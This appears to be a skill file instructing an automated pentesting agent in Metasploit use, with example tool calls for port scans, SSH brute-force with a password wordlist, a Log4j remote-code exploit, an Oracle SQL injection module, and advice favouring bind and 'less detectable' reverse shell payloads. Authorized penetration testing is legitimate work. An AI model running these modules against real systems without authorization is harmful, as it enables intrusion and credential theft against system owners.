---
name: metasploit
description: Metasploit Framework usage patterns, module selection, safe execution workflows, and output parsing for automated pentesting.
---

# Metasploit Framework Playbook

Official docs:
- https://docs.metasploit.com/
- https://www.rapid7.com/db/

## Ziro Integration Workflow

Always follow this sequence:
1. `msf_search` — find relevant modules
2. `msf_module_info` — understand options and targets
3. `msf_execute(check_only=true)` — verify vulnerability
4. `msf_execute(check_only=false)` — exploit only if authorized

All msf_* tools return commands to run via `terminal_execute`.

## Module Types

| Type | Purpose | Example |
|------|---------|---------|
| `exploit` | Exploit a vulnerability | `exploit/multi/http/apache_log4j_rce` |
| `auxiliary` | Scanning, fuzzing, brute-force | `auxiliary/scanner/ssh/ssh_login` |
| `post` | Post-exploitation (after shell) | `post/linux/gather/enum_system` |
| `evasion` | AV/IDS evasion payloads | `evasion/windows/applocker_evasion_msbuild` |

## Common Workflows

### Port scanning
```
msf_search("portscan", module_type="auxiliary")
msf_execute("auxiliary/scanner/portscan/tcp", {"RHOSTS": "10.0.0.0/24", "PORTS": "22,80,443,3306,8080", "THREADS": "10"}, check_only=false)
```

### Service version detection
```
msf_search("smb_version", module_type="auxiliary")
msf_execute("auxiliary/scanner/smb/smb_version", {"RHOSTS": "10.0.0.1"}, check_only=false)
```

### SSH brute-force
```
msf_execute("auxiliary/scanner/ssh/ssh_login", {
  "RHOSTS": "10.0.0.1",
  "USERNAME": "admin",
  "PASS_FILE": "/usr/share/wordlists/rockyou.txt",
  "THREADS": "5",
  "STOP_ON_SUCCESS": "true"
}, check_only=false)
```

### Web application exploits
```
msf_search("apache", module_type="exploit", platform="linux")
msf_module_info("exploit/multi/http/apache_log4j_rce")
msf_execute("exploit/multi/http/apache_log4j_rce", {
  "RHOSTS": "10.0.0.1",
  "RPORT": "8080",
  "TARGETURI": "/",
  "PAYLOAD": "cmd/unix/generic",
  "CMD": "id"
}, check_only=true)
```

### CVE-specific search
```
msf_search("cve-2021-44228", cve="CVE-2021-44228")
```

### SQL injection via module
```
msf_execute("auxiliary/sqli/oracle/dbms_cdc_subscribe_activate_subscription", {
  "RHOSTS": "10.0.0.1",
  "RPORT": "1521",
  "SID": "orcl"
}, check_only=false)
```

## Safe Payload Selection

Prefer these payloads for verification:
- `cmd/unix/generic` — runs a single command (use `CMD` option)
- `generic/shell_bind_tcp` — simple bind shell
- `cmd/unix/python` — Python reverse shell (less detectable)

Avoid reverse TCP meterpreter payloads in automated scans — they require listener setup and are blocked by the tool.

## Output Parsing

Key markers in msfconsole output:
- `[+]` — **Success**: vulnerability confirmed or credentials found
- `[-]` — **Failure**: target not vulnerable or exploit failed
- `[*]` — **Info**: progress updates, connection attempts
- `[!]` — **Warning**: potential issues or misconfigurations
- `[x]` — **Error**: critical failure

### Check mode results
- `[+] ... is vulnerable` → confirmed vulnerable, report it
- `[-] ... is not vulnerable` → not vulnerable
- `[-] ... does not support check` → module can't verify without exploiting

### Exploit mode results
- `[*] Command shell session X opened` → success, session established
- `[*] Meterpreter session X opened` → success with meterpreter
- `[-] Exploit failed` → module failed

## Critical Rules

1. **Always check before exploit** — use `check_only=true` first
2. **Minimize blast radius** — target specific hosts, not /16 ranges
3. **Use safe payloads** — `cmd/unix/generic` with `CMD=id` for verification
4. **Parse output carefully** — false positives are common in check mode
5. **Timeout handling** — some modules are slow; use `timeout=60` in terminal_execute
6. **Auxiliary scanners** — set `check_only=false` since they don't have check mode
7. **Rate limiting** — keep `THREADS` reasonable (5-10) to avoid target DoS
8. **Report findings** — use `report_vulnerability` for confirmed vulns with MSF output as evidence

## Failure Recovery

- Module not found → `msfupdate` or search with broader terms
- Connection refused → verify target is up with nmap first
- Timeout → reduce THREADS, increase timeout
- "Not vulnerable" but suspicious → try different module or manual verification
- Session dies immediately → try different payload or check target architecture
